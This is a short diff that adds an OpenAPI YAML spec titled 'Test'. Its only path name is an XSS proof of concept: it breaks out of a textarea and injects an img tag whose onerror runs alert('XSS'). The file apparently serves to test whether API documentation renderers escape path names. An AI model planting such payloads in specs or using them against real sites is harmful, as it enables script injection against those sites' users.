@@ -1,0 +1,11 @@
+openapi: 3.0.1
+info:
+  title: Test
+  version: 1.0
+paths:
+  "/test</textarea><img src=1 onerror=alert('XSS')>":
+    get:
+      summary: "XSS PoC"
+      responses:
+        '200':
+          description: OK
